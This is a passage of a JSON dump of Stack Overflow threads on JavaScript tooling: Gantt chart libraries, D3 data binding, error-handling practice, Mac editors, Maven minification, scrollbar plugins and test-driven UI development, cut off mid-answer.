                    "body": "<p><a href=\"http://mbielanczuk.com/2011/06/jquery-gantt-chart/\" rel=\"nofollow\">JQuery Gantt Chart</a> - the best I tested</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>This is a complete jQuery based Gantt Editor Mit licensed</p>\n\n<p><a href=\"http://roberto.open-lab.com/2012/08/24/jquery-gantt-editor/\" rel=\"nofollow\">http://roberto.open-lab.com/2012/08/24/jquery-gantt-editor/</a> </p>\n\n<p>If you want a \"complete\" review of available ones see here:</p>\n\n<p><a href=\"http://roberto.open-lab.com/2012/06/14/the-javascript-gantt-odyssey/\" rel=\"nofollow\">http://roberto.open-lab.com/2012/06/14/the-javascript-gantt-odyssey/</a> </p>\n\n<p>I Have recently added SVG based drawing and collapse/expand tree functionality.</p>\n\n<p>See <a href=\"http://roberto.open-lab.com/2014/05/15/jquery-gantt-editor-collapsible-branches/\" rel=\"nofollow\">http://roberto.open-lab.com/2014/05/15/jquery-gantt-editor-collapsible-branches/</a></p>\n",
                    "is_accepted": false,
                    "score": 6
                },
                {
                    "body": "<p>I noticed that <a href=\"http://www.radiantq.com/\" rel=\"nofollow\"><strong>RadiantQ's jQuery Gantt Chart Package</strong></a> is missing in this discussion. This is relatively new, but has a lot of features, customizable and can be bound to any kind of data. The online demo is <strong><a href=\"http://demos.radiantq.com/jQueryGanttDemo/Demo.htm\" rel=\"nofollow\">here</a></strong>.</p>\n",
                    "is_accepted": false,
                    "score": 2
                }
            ],
            "body": "<p>I need to insert a horizontal bar chart in a web page. The thing I have to do is very similar to a Gantt Chart.</p>\n\n<p>I'd like to use a javascript library for the purpose. I tried jsgantt, but actually it is not very beautiful.</p>\n\n<p>I could evaluate also a server generation of the graph. In case my server side language is Python.</p>\n\n<p>It will be part of an internal project with no internet access, so Google Charts isn't an option.</p>\n",
            "last_activity_date": 1401368692,
            "question_id": 1005587,
            "score": 17,
            "tags": [
                "javascript",
                "python",
                "charts",
                "gantt-chart"
            ],
            "title": "Gantt Chart online"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>Here are some good links:</p>\n\n<ul>\n<li><p>Good discussion on D3 \"data()\":\n<a href=\"http://stackoverflow.com/questions/9481497/understanding-how-d3-js-binds-data-to-nodes\">Understanding how D3.js binds data to nodes</a></p></li>\n<li><p><a href=\"http://www.recursion.org/d3-for-mere-mortals/\">D3 for Mere Mortals</a></p></li>\n<li><p><a href=\"https://github.com/mbostock/d3/wiki/Selections\">Mike Bostock's D3 Wiki</a></p></li>\n</ul>\n\n<p>Per the latter:</p>\n\n<blockquote>\n  <p><code># selection.data([values[, key]])</code></p>\n  \n  <p>Joins the specified array of data with the current selection. The\n  specified values is an array of data values, such as an array of\n  numbers or objects, or a function that returns an array of values. </p>\n  \n  <p>...</p>\n  \n  <p><code># selection.datum([value])</code></p>\n  \n  <p>Gets or sets the bound data for each selected element. Unlike the\n  selection.data method, this method does not compute a join (and thus\n  does not compute enter and exit selections).</p>\n</blockquote>\n",
                    "is_accepted": false,
                    "score": 15
                },
                {
                    "body": "<p>I found the correct answer here from Mike himself:</p>\n\n<p><a href=\"http://stackoverflow.com/questions/10086167/d3-how-to-deal-with-json-data-structures\">D3 - how to deal with JSON data structures?</a></p>\n\n<p>If you want to bind your data to a single SVG element, use </p>\n\n<pre><code>(...).data([data])\n</code></pre>\n\n<p>or</p>\n\n<pre><code>(...).datum(data)\n</code></pre>\n\n<p>If you want to bind your data to multiple SVG elements</p>\n\n<pre><code>(...).data(data).enter().append(\"svg\")\n</code></pre>\n\n<p>.....</p>\n",
                    "is_accepted": true,
                    "score": 70
                }
            ],
            "body": "<p>Can someone please explain the difference between datum() and data() in D3.js? I see both being used and I am not sure why you should choose one over the other?</p>\n",
            "last_activity_date": 1361377947,
            "question_id": 13728402,
            "score": 68,
            "tags": [
                "javascript",
                "d3.js"
            ],
            "title": "What is the difference D3 datum vs. data?"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p>IHMO, you should use error handling in javascript like you do in several other languages (AFAIK: Python, Java).</p>\n\n<p>For better readability (and probably better performance, even though I am not sure it has a really big impact), you should use the try / catch block mostly on the following cases :</p>\n\n<ul>\n<li><p>The part of the code you want to wrap is a key <strong>part of the whole algorithm</strong>. If it fails, it could :</p>\n\n<ul>\n<li>create errors on the next part of the codes (e.g. because a var is missing...)</li>\n<li>make the page not look what expected (impact on content or css)</li>\n<li>make the results appear strange to the user (impact on the code behavior)   </li>\n</ul></li>\n<li><p>You know that the code you are writing is <strong>not compatible with every browser</strong></p></li>\n<li>You planned that the <strong>code may fail</strong> (because there is no other way to check that it should work by if...then... blocks)</li>\n<li>And also when you want to <strong>debug</strong> without bothering the final user</li>\n</ul>\n\n<p>Eventually, javascript experts may have other elements to give.</p>\n\n<p><em>my 2 cents to the box,</em></p>\n\n<p>Regards,</p>\n\n<p>Max</p>\n",
                    "is_accepted": false,
                    "score": 6
                },
                {
                    "body": "<p>An immensely interesting set of slides on Enterprise JavaScript Error Handling can be found at <a href=\"http://www.devhands.com/2008/10/javascript-error-handling-and-general-best-practices/\">http://www.devhands.com/2008/10/javascript-error-handling-and-general-best-practices/</a></p>\n\n<p>In sort it summarises</p>\n\n<ol>\n<li>Assume your code will fail</li>\n<li>Log errors to the server</li>\n<li>You, not the browser, handle errors</li>\n<li>Identify where errors might occur</li>\n<li>Throw your own errors</li>\n<li>Distinguish fatal versus non-fatal errors</li>\n<li>Provide a debug mode</li>\n</ol>\n\n<p>The slides go into much more detail and most probably will give you some direction.</p>\n\n<p>UPDATE</p>\n\n<p>The presentation mentioned above can be found here:\n<a href=\"http://www.slideshare.net/nzakas/enterprise-javascript-error-handling-presentation\">http://www.slideshare.net/nzakas/enterprise-javascript-error-handling-presentation</a></p>\n",
                    "is_accepted": false,
                    "score": 29
                },
                {
                    "body": "<p>Nicholas Zakas of Yahoo! fame did a talk on Enterprise Error Handling (<a href=\"http://www.slideshare.net/nzakas/enterprise-javascript-error-handling-presentation\">slides</a>) at Ajax Experience 2008, in which he proposed something like this:</p>\n\n<pre><code>function log(sev,msg) {\n    var img = new Image();\n    img.src = \"log.php?sev=\" +\n        encodeURIComponent(sev) +\n        \"&amp;msg=\" + encodeURIComponent(msg);\n}\n\n// usage\nlog(1, \"Something bad happened.\")\n\n// Auto-log uncaught JS errors\nwindow.onerror = function(msg, url, line) {\n    log(1, msg);\n    return true;\n}\n</code></pre>\n\n<p>A year later, Nicholas Zakas posted an <a href=\"http://www.nczonline.net/blog/2009/04/28/javascript-error-handling-anti-pattern/\">update on his blog</a> which included a clever pattern to inject error handling code automatically on your production environment (using aspect-oriented programming).</p>\n\n<p>When you start logging window.error calls, you're going to notice two things:</p>\n\n<ol>\n<li>If your site is fairly complex, you're going to log a <em>lot</em> of errors</li>\n<li>You'll be seeing a bunch of useless \"window.error in undefined:0\" messages</li>\n</ol>\n\n<p>Reducing the torrent of log entries is as simple as testing for severity and/or a random number before logging to the server:</p>\n\n<pre><code>function log(sev,msg) {\n    if (Math.random() &gt; 0.1) return; // only log some errors\n\n    var img = new Image();\n    img.src = \"log.php?sev=\" +\n        encodeURIComponent(sev) +\n        \"&amp;msg=\" + encodeURIComponent(msg);\n}\n</code></pre>\n\n<p>Handling the useless \"window.error in undefined:0\" errors depends on your site architecture, but can try identifying all Ajax calls and throwing an exception when something fails (possibly returning a stack trace using <a href=\"http://stacktracejs.com/\">stacktrace.js</a>).</p>\n",
                    "is_accepted": false,
                    "score": 19
                },
                {
                    "body": "<p>In addition to the other answers: one important thing is to <strong>use context data</strong> available in JavaScript error objects and in the window.onerror function parameters.</p>\n\n<p>Things like the stacktrace (errorObject.stack), the filename, the line number and the column number.\nNote that each browser has some differences...so do your best effort to get nice errors.</p>\n\n<p>There can even be problems with the <a href=\"http://stackoverflow.com/questions/3767924/js-override-console-log-if-not-defined\">console object itself</a>.\nI use <a href=\"http://danlimerick.wordpress.com/2014/01/18/how-to-catch-javascript-errors-with-window-onerror-even-on-chrome-and-firefox/\" rel=\"nofollow\">a custom window.onerror function inspired by this one</a> and a special function to trace any given standard error object inspired by <a href=\"http://stackoverflow.com/questions/5802840/javascript-node-js-getting-line-number-in-try-catch\">this code</a>.</p>\n\n<p>Another good point is to include the version of your web application somewhere close to the stacktrace (for quick and safe copy and pasting). You may also show errors more aggressively (alert...) in development mode as developers will not constantly monitor the browser console and may not see some of the problems.</p>\n\n<p>Also use avoid using <code>throw 'My message'</code>, use <code>throw new Error('My message')</code>, you can even have custom errors, read <a href=\"http://www.nczonline.net/blog/2009/03/10/the-art-of-throwing-javascript-errors-part-2/\" rel=\"nofollow\">this article</a>.</p>\n\n<p>Always add some context to the errors (the version, the id of the object, some custom message, ...) and also make sure you make a distinction between external errors (some external data or force made your system fail) and internal errors/assertions (your own system messed up), read about '<a href=\"http://en.wikipedia.org/wiki/Design_by_contract\" rel=\"nofollow\">Design by contract</a>'.</p>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
            "body": "<p>I'm looking to start making my JavaScript a bit more error proof, and I'm finding plenty of documentation on using <code>try</code>, <code>catch</code>, <code>finally</code>, and <code>throw</code>, but I'm not finding a ton of advice from experts on when and where to throw errors.</p>\n\n<ul>\n<li>Should every piece of code be wrapped in a try/catch?</li>\n<li>Is there more advice like <a href=\"http://www.nczonline.net/blog/2009/04/28/javascript-error-handling-anti-pattern/\">this on</a> at what point errors ought to be caught?</li>\n<li>Are there disadvantages to raising errors instead of having code fail silently in production?</li>\n<li>This has been touched on on SO as far as implementations, but have server-logging JS errors an effective strategy?</li>\n<li>Anything else I ought to know, regarding trapping errors in my application?</li>\n</ul>\n\n<p>I'm also completely game for hearing of books that have great chapters or in-depth explanations of error-handling. <a href=\"http://eloquentjavascript.net/chapter5.html\">Eloquent JavaScript</a> touches on the matter, but isn't very prescriptive or opinionated about the issue. </p>\n\n<p>Thanks for any advice you can give!</p>\n",
            "last_activity_date": 1418308400,
            "question_id": 6484528,
            "score": 66,
            "tags": [
                "javascript",
                "error-handling"
            ],
            "title": "What are the best practices for JavaScript error handling?"
        },
        {
            "answer_count": 14,
            "answers": [
                {
                    "body": "<p>you should visit <a href=\"http://www.editrocket.com/features/javascript%5Feditor.html\" rel=\"nofollow\">this</a> link.. i hope u get your editor</p>\n\n<p><a href=\"http://webscripts.softpedia.com/script/WYSIWYG-Editors/EditArea-14415.html\" rel=\"nofollow\">This</a> mac javascript editor is free.. </p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>I've used both <a href=\"http://macromates.com/\" rel=\"nofollow\">TextMate</a> and <a href=\"http://www.eclipse.org\" rel=\"nofollow\">Eclipse</a> for javascript work on my mac, even though the latter is cross platform.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p><a href=\"http://www.jedit.org/\" rel=\"nofollow\" title=\"jEdit\">jEdit</a>, because I can also use it on Windows and Linux. Has FTP and SSH support via a plugin, not sure about code completion.</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p><a href=\"http://www.vim.org\" rel=\"nofollow\">Vim</a> is great but requires a plugin to get indenting correct. See <a href=\"http://stackoverflow.com/questions/1201509/how-do-i-make-vim-indent-javascript-in-html\">http://stackoverflow.com/questions/1201509/how-do-i-make-vim-indent-javascript-in-html</a></p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>Many of the big Java-based IDEs now have JavaScript syntax checking--like having JSLint built-in.</p>\n\n<p>NetBeans is one I've had luck with recently.</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>Emacs has a really good mode for editing JavaScript called <a href=\"http://code.google.com/p/js2-mode/\" rel=\"nofollow\">js2-mode</a>.  The mode includes syntax highlighting, highlighting of errors (undeclared variables, missing semicolons, etc).  Another plus is that by using emacs you get file-based autocompletion by using M-/.  If you're an emacs user I highly recommend it.</p>\n\n<p>As an aside, I've written an additional mode that allows you to interactively work with JavaScript in emacs.  The mode is called <a href=\"http://github.com/bkyle/inf-js\" rel=\"nofollow\">inf-js</a>.  Usage information can be found on my <a href=\"http://bryan-kyle.blogspot.com/2008/07/inf-jsel.html\" rel=\"nofollow\">blog</a>.</p>\n",
                    "is_accepted": false,
                    "score": 5
                },
                {
                    "body": "<p>I use TextWrangler (free), and for FTP I use \"Transmit\". Transmit has the cool property of making every app \"FTP enabled\", simply through writing to that file. So Transmit makes TextWrangler \"Ftp enabled\" :)</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>I use Eclipse, and if the moon is blue, <a href=\"http://www.panic.com/coda/\" rel=\"nofollow\">Coda</a>.  They both have integrated FTP/SFTP/SVN support, but I prefer Eclipse.</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>IntelliJ IDEA has very good JS-support. Full blown completion, inspections and refactoring.</p>\n",
                    "is_accepted": false,
                    "score": 9
                },
                {
                    "body": "<p>I use and love <a href=\"http://macromates.com/\">TextMate</a>. (I use it for most of my coding\u2014not just for JavaScript.)</p>\n\n<p>Features:</p>\n\n<ul>\n<li>Good UI</li>\n<li>Intelligent indentation</li>\n<li>Included \"Bundles\" make it very powerful</li>\n<li>Extremely extensible (you can create your own snippets, bundles, etc. to automate your workflow)</li>\n</ul>\n\n<p>See the <a href=\"http://stackoverflow.com/questions/1022579/whats-so-great-about-textmate\">What's so great about TextMate?</a> and <a href=\"http://stackoverflow.com/questions/1380418/how-to-improve-the-way-i-use-textmate-for-ruby-on-rails-html-css-and-javascript\">How to improve the way I use Textmate for Ruby on Rails, HTML, CSS and Javascript?</a>  StackOverflow threads, <a href=\"http://domhay.com/blog/2009/10-cool-textmate-tips\">10 cool TextMate tips</a>, and <a href=\"http://www.456bereastreet.com/archive/200811/textmate%5Fproductivity%5Ftips/\">TextMate productivity tips</a> to see some of the neat things that it can do.</p>\n\n<p>Then, download the 30 day trial and try it out for yourself!</p>\n\n<p>For FTP, I use (and also love) Panic's <a href=\"http://www.panic.com/transmit/\">Transmit</a>. I am yet to find another FTP client for Mac OS X that combines a beautiful UI with fantastic functionality.</p>\n",
                    "is_accepted": true,
                    "score": 44
                },
                {
                    "body": "<p>You should try <a href=\"http://aptana.org\">Aptana</a>\nIt's just the best Javascript IDE I've ever seen. It has Code Completition, SVN and GIT support, additional SQL, PHP, RUBY editors. And also great FTP support</p>\n",
                    "is_accepted": false,
                    "score": 15
                },
                {
                    "body": "<p><a href=\"http://macrabbit.com/espresso/\">Espresso</a> is my preferred text editor for web development.  Simple, easy on the eyes, good syntax coloring, tabs for multiple files.  </p>\n\n<p>Also has a useful project mode which groups all related files, then integrates them with its own (S)FTP client for easily syncing changes with the server.  </p>\n",
                    "is_accepted": false,
                    "score": 9
                },
                {
                    "body": "<p><a href=\"http://www.sublimetext.com/2\">Sublime Text 2</a> has really started to gain traction among developers. Here are some reasons why:</p>\n\n<ul>\n<li><del>It's Free (if you don't mind the notification)</del> So it's technically not free but about as close as you can get </li>\n<li>It's cross platform compatible (Win, OSX, Linux)</li>\n<li>Crazy good plugins with Package Control (Git, LiveReload, JSLint, Auto Complete, Additional Syntax)</li>\n<li>Super beautiful</li>\n<li>Super fast (leaves Aptana &amp; other Java IDE's in the dust)</li>\n<li><a href=\"http://1p1e1.tumblr.com/post/14262857223/9-reasons-you-must-install-sublime-text-2-code-like-a\">It makes you fly like Superman, fight like Chuck Norris and code like Linus Torvalds</a></li>\n</ul>\n\n<p><img src=\"http://i.stack.imgur.com/7Nosn.png\" alt=\"enter image description here\"></p>\n",
                    "is_accepted": false,
                    "score": 60
                },
                {
                    "body": "<p><strong>Nide</strong> is a new kid on the block. </p>\n\n<p>It looks awesome and can be launched as an app or as a webserver for editing the sourcecode in your browser.\nCurrently it is missing IDE features like completion etc but it's open source and should be extendable since it uses <a href=\"http://codemirror.net\" rel=\"nofollow\">http://codemirror.net</a> under the hood.</p>\n\n<p><a href=\"http://coreh.github.com/nide/\" rel=\"nofollow\">http://coreh.github.com/nide/</a></p>\n",
                    "is_accepted": false,
                    "score": 2
                }
            ],
            "body": "<p>Similar to <a href=\"http://stackoverflow.com/questions/713889/what-is-your-favourite-javascript-jquery-code-editor\">http://stackoverflow.com/questions/713889/what-is-your-favourite-javascript-jquery-code-editor</a>, but Mac only.</p>\n\n<p>In my case, BBEdit for auto-completion, and Coda for integrated FTP support.</p>\n\n<p>Update: please include reasons why you prefer which editor, so the others could benefit from it.</p>\n",
            "last_activity_date": 1389742137,
            "question_id": 1724234,
            "score": 57,
            "tags": [
                "javascript",
                "text-editor"
            ],
            "title": "Preferred Javascript editor for Mac?"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>Take a look at the <a href=\"http://alchim.sourceforge.net/yuicompressor-maven-plugin/index.html\">yuicompressor-maven-plugin</a>. It can aggregate various js (as well as css) files as well as minify and obfuscate them.</p>\n",
                    "is_accepted": true,
                    "score": 19
                },
                {
                    "body": "<p>I've successfully incorporated RequireJS optimization (uses Google Closure compiler + does concatenation) in a Maven environment (for single page JS app). See my question and the follow up answer for details: <a href=\"http://stackoverflow.com/questions/4663686/requirejs-compilation-in-maven-project-with-external-js-dependencies\">RequireJS Compilation in Maven project with external JS dependencies</a></p>\n\n<p>You could probably expand on that to version and archive the minified JS artifacts.</p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>Here's a brand-new Maven plugin that targets this task: <a href=\"http://mojo.codehaus.org/webminifier-maven-plugin/\">http://mojo.codehaus.org/webminifier-maven-plugin/</a></p>\n",
                    "is_accepted": false,
                    "score": 10
                }
            ],
            "body": "<h2>Single Page Javascript Application</h2>\n\n<p>I have built a sophisticated ajax-driven single page webapp that uses a RESTful backend web service serving JSON. The javascript is split into many different files, each file representing some sort of feature or component.</p>\n\n<p>While the service has been in <em>alpha</em> testing, I've just be serving all these files separately without minification. But now that I'd like to launch a <em>beta</em> version, I really need to combine files, minify them, and version them. I want to add this to my build process, using Maven.</p>\n\n<h2>Javascript File Types</h2>\n\n<p>I'm using the following \"types\" of javascript files, of which #3 and #4 are my concerns:</p>\n\n<ol>\n<li>External files, such a jquery and jquery-ui served from the Google CDN. Rarely change these versions, can be handled manually.</li>\n<li>Jquery plugins that I'm hosting myself, such as fullcalendar or ui-layout. Again, I rarely update these to new versions and can handle it manually.</li>\n<li>Application-wide javascript code. Custom javascript that is spread across many files and can change occasionally. All of these files need to be loaded for the app to work.</li>\n<li>Feature-specific javascript code. Custom javascript that is loaded on demand when a specific feature is requested. This code can change quite frequently and is not loaded at startup.</li>\n</ol>\n\n<h2>Build Objectives</h2>\n\n<p>I'd like to do the following during my build process:</p>\n\n<ul>\n<li>Concatenate all type 3 javascript files together, minify them, and save as a single file with a version number. For instance: <code>app-2.0.6.min.js</code>, where 2.0.6 is the maven project version.</li>\n<li>All type 4 files should be individually minified and saved as separate files with version numbers in the name. For instance: <code>feature-abc-56ab32de29.min.js</code>, where 56ab32de29 is the version number of that specific file.</li>\n<li>Update HTML files with <code>&lt;script&gt;</code> tags to point to javascript files with the correct version numbers.</li>\n<li>Update Javscript files that load type 4 feature javascript files to point to the right versions.</li>\n</ul>\n\n<h2>Questions</h2>\n\n<ul>\n<li><p>Is there a maven plugin that will assist with the concatenation?</p></li>\n<li><p>Is there a maven plugin that will assist with the minification? Ideally, I'd like to use Google Closure Compiler, but would work with others if simpler.</p></li>\n<li><p>Is there a maven plugin that will assist with the versioning? </p></li>\n<li><p>Is there a way to have the type 4 javascript files have independent version numbers? Ideally, if a file doesn't change between version 2.0.5 and 2.0.6, there is no need for users to download a new version and their cached version would work fine. I'm using GIT for source control, so would there be a way to use a file's GIT hashcode for versioning?</p></li>\n<li><p>Is there a solution that will compress the javascript that is inline in regular HTML files without killing the HTML?</p></li>\n<li><p>Is there a solution that will compress and version my CSS files as well?</p></li>\n</ul>\n",
            "last_activity_date": 1326304179,
            "question_id": 3965801,
            "score": 44,
            "tags": [
                "javascript",
                "git",
                "build",
                "maven",
                "minify"
            ],
            "title": "Maven plugin for versioning and minifying javascript"
        },
        {
            "answer_count": 10,
            "answers": [
                {
                    "body": "<p>The scrollpane Jquery Plugin is the closest you'll get. </p>\n\n<p><a href=\"http://jscrollpane.kelvinluck.com/\" rel=\"nofollow\">http://jscrollpane.kelvinluck.com/</a></p>\n\n<p>see the lozenge demo: <a href=\"http://jscrollpane.kelvinluck.com/themes/lozenge/\" rel=\"nofollow\">http://jscrollpane.kelvinluck.com/themes/lozenge/</a></p>\n\n<p>To make it more like Lion, you could customize it to only show the bar when the track div is hovered over and ensure you use the <code>animateEase</code> function.</p>\n\n<p>Oh and for extra Apple goodness change the direction of the scroll so down is up and up is down :-)</p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>The day Lion was released I was very fond of the scrollbar in the OS. The browsers already have a slick default scrollbar but I thought how about them Windows users ;).</p>\n\n<p>It is still under construction but it might help you out: <a href=\"https://www.finch-solutions.com/scripts/osxscroll/\" rel=\"nofollow\">OSX Scroll</a></p>\n\n<p>Based on <a href=\"http://www.baijs.nl/tinyscrollbar/\" rel=\"nofollow\">tinyscrollbar</a> but I made some adjustments. You can enable autohide (like in the OS). Just have a look at the source files.</p>\n\n<p>Hope it helps.</p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>Interesting stuff, I wrote a plugin that does just that. It's called <a href=\"https://github.com/Charuru/lionbars\">LionBars</a>.</p>\n",
                    "is_accepted": false,
                    "score": 41
                },
                {
                    "body": "<p><a href=\"http://jamesflorentino.github.com/nanoScrollerJS/\">nanoScroller.js</a> is a jQuery plugin that coded with Coffeescript and it makes its job: <a href=\"http://jamesflorentino.github.com/nanoScrollerJS/\">http://jamesflorentino.github.com/nanoScrollerJS/</a></p>\n",
                    "is_accepted": false,
                    "score": 13
                },
                {
                    "body": "<p>jScrollPane plus a little bit of modification would do.</p>\n\n<p>There is a tutorial about it:\n<a href=\"http://www.queness.com/post/11809/transform-jscrollpane-into-mac-osx-lion-scroll-bar\" rel=\"nofollow\">http://www.queness.com/post/11809/transform-jscrollpane-into-mac-osx-lion-scroll-bar</a></p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p><code>nanoscroller</code> or <code>nicescroller</code> would be a better option for smooth scrolling.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<h3><strong><a href=\"https://github.com/LearnBoost/antiscroll\">Antiscroll</a></strong> is probably one of the <strong>best</strong> plugins available that recreates Mac OS X Lion scrollbars in every browser.</h3>\n\n<p>Some of the <em>great</em> features of <strong><a href=\"https://github.com/LearnBoost/antiscroll\">Antiscroll</a></strong>:</p>\n\n<ol>\n<li>Fades in and out</li>\n<li><strong>Size of container can be dynamically adjusted and scrollbars will adapt</strong></li>\n<li>Supports mousewheels, trackpads, other input devices natively</li>\n<li>Shows scrollbars upon hovering</li>\n<li>Supports <strong>IE7+, Firefox 3+, Chrome, Safari, Opera</strong></li>\n</ol>\n\n<p><img src=\"http://i.stack.imgur.com/cxKXU.png\" alt=\"enter image description here\"></p>\n\n<p>Demo: <a href=\"http://learnboost.github.io/antiscroll/\">http://learnboost.github.io/antiscroll/</a></p>\n",
                    "is_accepted": true,
                    "score": 36
                },
                {
                    "body": "<h3>This is an old question.. but maybe someone is still interested in my version:</h3>\n\n<p><strong>Source:</strong> <a href=\"https://github.com/pixelass/customScrollBar\" rel=\"nofollow\">https://github.com/pixelass/customScrollBar</a></p>\n\n<p><strong>Example:</strong> <a href=\"http://pixelass.github.io/customScrollBar/\" rel=\"nofollow\">http://pixelass.github.io/customScrollBar/</a></p>\n\n<p><em>This plugin actually replicates the scrollbar more precisely than antiscroll or nicescroll.. etc.</em></p>\n\n<p>The plugin allows full control over the scrollbars (currently only vertical) and does not require mousewheel.js (as most plugins do)\nRemoving this dependency was the main goal of my version.</p>\n\n<p>It also listens to the scroll event (as antiscroll does).\nThe fade-in and hover resize on the scrollbars were missing on all other plugins I found. My version includes an example to show how to achieve this effect.</p>\n\n<p>There are optional (pseudo-)event-listeners \"scrollEnded\" \"clicked\" which are fired when the user's scroll has ended or when the scroll-bar-thumb is clicked.</p>\n\n<p>This plugin also allows almost any imaginable style and setting of the scrollbar, as click-arrows (up-down-arrows).</p>\n\n<h3>Alpha</h3>\n\n<p>This is still alpha (time of posting) but development will continue as time passes.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Use my plugin: <a href=\"https://github.com/silviomoreto/scrollYou\" rel=\"nofollow\">scrollYou</a></p>\n\n<p>It uses a simple approach to make the scroll inside the own element. So you dont have to add more elements to make it roll.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>This one has scroll bars like the ones on Mac:</p>\n\n<p><a href=\"https://github.com/mzubala/jquery-custom-scrollbar\" rel=\"nofollow\">https://github.com/mzubala/jquery-custom-scrollbar</a></p>\n\n<p>and is very simple to install. You can basically apply any skin you like with css.</p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>Does anyone know a jQuery plugin that makes Mac OS X Lion style scrollbars for every browser?</p>\n\n<p>Thanks in advance.</p>\n\n<p><em>Edit:</em> Here's an image for Windows users</p>\n\n<p><img src=\"http://i.stack.imgur.com/Oz5Ih.jpg\" alt=\"enter image description here\"></p>\n",
            "last_activity_date": 1380724852,
            "question_id": 6863748,
            "score": 42,
            "tags": [
                "javascript",
                "jquery",
                "scrollbar",
                "osx-lion"
            ],
            "title": "Lion-like scrollbar with jQuery?"
        },
        {
            "answer_count": 7,
            "answers": [
                {
                    "body": "<p>This is the primary reason I switched to the Google Web Toolkit ... I develop and test in Java and have a reasonable expectation that the compiled JavaScript will function properly on a variety of browsers.  Since TDD is primarily a unit testing function, most of the project can be developed and tested before compilation and deployment.</p>\n\n<p>Integration and Functional test suites verify that the resulting code is functioning as expected after it's deployed to a test server.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>I've never successfully TDDed UI code. The closest we came was indeed to separate UI code as much as possible from the application logic. This is one reason why the model-view-controller pattern is useful - the model and controller can be TDDed without much trouble and without getting too complicated.</p>\n\n<p>In my experience, the view was always left for our user-acceptance tests (we wrote web applications and our UATs used Java's HttpUnit). However, at this level it's really an integration test, without the test-in-isolation property we desire with TDD. Due to this setup, we had to write our controller/model tests/code first, then the UI and corresponding UAT. However, in the Swing GUI code I've been writing lately, I've been writing the GUI code first with stubs to explore my design of the front end, before adding to the controller/model/API. YMMV here though.</p>\n\n<p>So to reiterate, the only advice I can give is what you already seem to suspect - separate your UI code from your logic as much as possible and TDD them.</p>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p>I'm just about to start doing Javascript TDD on a new project I am working on. My current plan is to use <a href=\"http://docs.jquery.com/QUnit\" rel=\"nofollow\">qunit</a> to do the unit testing. While developing the tests can be run by simply refreshing the test page in a browser.</p>\n\n<p>For continuous integration (and ensuring the tests run in all browsers), I will use <a href=\"http://selenium.openqa.org/\" rel=\"nofollow\">Selenium</a> to automatically load the test harness in each browser, and read the result. These tests will be run on every checkin to source control.</p>\n\n<p>I am also going to use <a href=\"http://siliconforks.com/jscoverage/\" rel=\"nofollow\">JSCoverage</a> to get code coverage analysis of the tests. This will also be automated with Selenium.</p>\n\n<p>I'm currently in the middle of setting this up. I'll update this answer with more exact details once I have the setup hammered out.</p>\n\n<p><hr /></p>\n\n<p>Testing tools:</p>\n\n<ul>\n<li><a href=\"http://docs.jquery.com/QUnit\" rel=\"nofollow\">qunit</a></li>\n<li><a href=\"http://siliconforks.com/jscoverage/\" rel=\"nofollow\">JSCoverage</a></li>\n<li><a href=\"http://selenium.openqa.org/\" rel=\"nofollow\">Selenium</a></li>\n</ul>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>I've done some TDD with Javascript in the past, and what I had to do was make the distinction between Unit and Integration tests. Selenium will test your overall site, with the output from the server, its post backs, ajax calls, all of that. But for unit testing, none of that is important.</p>\n\n<p>What you want is just the UI you are going to be interacting with, and your script. The tool you'll use for this is basically <a href=\"https://github.com/pivotal/jsunit\" rel=\"nofollow\">JsUnit</a>, which takes an HTML document, with some Javascript functions on the page and executes them in the context of the page. So what you'll be doing is including the Stubbed out HTML on the page with your functions. From there,you can test the interaction of your script with the UI components in the isolated unit of the mocked HTML, your script, and your tests.</p>\n\n<p>That may be a bit confusing so lets see if we can do a little test. Lets to some TDD to assume that after a component is loaded, a list of elements is colored based on the content of the LI. </p>\n\n<p><strong>tests.html</strong></p>\n\n<pre><code>&lt;html&gt;\n&lt;head&gt;\n&lt;script src=\"jsunit.js\"&gt;&lt;/script&gt;\n&lt;script src=\"mootools.js\"&gt;&lt;/script&gt;\n&lt;script src=\"yourcontrol.js\"&gt;&lt;/script&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;ul id=\"mockList\"&gt;\n        &lt;li&gt;red&lt;/li&gt;\n        &lt;li&gt;green&lt;/li&gt;\n    &lt;/ul&gt;   \n&lt;/body&gt;\n&lt;script&gt;\n    function testListColor() {\n        assertNotEqual( $$(\"#mockList li\")[0].getStyle(\"background-color\", \"red\") );\n\n        var colorInst = new ColorCtrl( \"mockList\" );\n\n        assertEqual( $$(\"#mockList li\")[0].getStyle(\"background-color\", \"red\") );\n    }\n&lt;/script&gt;\n\n\n&lt;/html&gt;\n</code></pre>\n\n<p>Obviously TDD is a multi-step process, so for our control, we'll need multiple examples. </p>\n\n<p><strong>yourcontrol.js (step1)</strong></p>\n\n<pre><code>function ColorCtrl( id ) {\n /* Fail! */    \n}\n</code></pre>\n\n<p><strong>yourcontrol.js 